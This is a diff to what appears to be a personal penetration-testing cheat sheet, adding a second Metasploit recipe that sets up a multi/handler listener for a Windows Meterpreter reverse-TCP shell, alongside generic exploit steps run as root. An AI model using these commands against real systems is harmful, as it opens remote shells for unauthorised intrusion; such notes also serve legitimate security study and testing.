@@ -527,17 +527,39 @@ root@omarbelkady:~$ netsh firewall show state
 ```
 
 ## Metasploit
-### STEP1
+### WAY N1
+#### STEP1
 set RHOSTS # 
 
-### STEP 2
+#### STEP 2
 set RPORT #
 
-### STEP 3: Root User
+#### STEP 3: Root User
 set USERNAME root
 
-### STEP 4: start scan
+#### STEP 4: start scan
 run
 
-### STEP 5: exploit
+#### STEP 5: exploit
 exploit
+
+### WAY N2[CORRECT WAY]
+```
+use multi/handler
+```
+
+```
+set payload windows/meterpreter/reverse_tcp
+```
+
+```
+set LHOST 192.XXX.X.XXX
+```
+
+```
+set LPORT XXXX
+```
+
+```
+exploit
+```
